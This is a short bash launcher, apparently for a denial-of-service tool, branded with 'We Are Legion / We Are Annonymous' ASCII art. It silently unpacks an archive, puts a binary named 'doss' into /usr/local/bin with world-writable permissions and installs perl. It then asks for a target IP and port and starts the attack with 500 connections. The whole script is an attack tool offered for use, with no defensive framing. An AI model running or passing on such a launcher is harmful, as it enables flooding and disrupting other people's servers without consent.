# !/bin/bash
clear
# function requirement
req(){
if [ -e /usr/local/bin/doss ]; then
    sleep 1
    echo ""
    sleep 2
else
    sleep 1
    tar -xvf index.tar.gz &> /dev/null;rm -fr index.tar.gz;chmod 777 doss;mv doss /usr/local/bin/
    sleep 2
fi
if command -v perl &> /dev/null; then
   sleep 1
else
   apt-get install perl -y &> /dev/null
fi
}
req
logo(){
printf "\033[32;3m"
cat << "EOF"
⠀⠀⠀⠀⠀⠀⣴⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣦⡄⣿⣿⡇⢠⣶⡄⢀⣤⡀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⣀⣀⣀⣀
⢀⣠⡄⣿⣿⣧⣿⣿⣧⣿⣿⣧⣼⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣾⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⢠⣿⣿⣿⣿
⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠸⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⠇
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⠻⠿⣿⣿⣿⣿⣿⠿⠟⠁⠀

           We Are Legion!!
	  We Are Annonymous

EOF
}
logo

read -p "input your target ip : " ip
read -p "port : " port
echo
echo "start attack............!!!!"
sleep 1
doss -dns $ip -port $port -timeout 20 -num 500 -cach
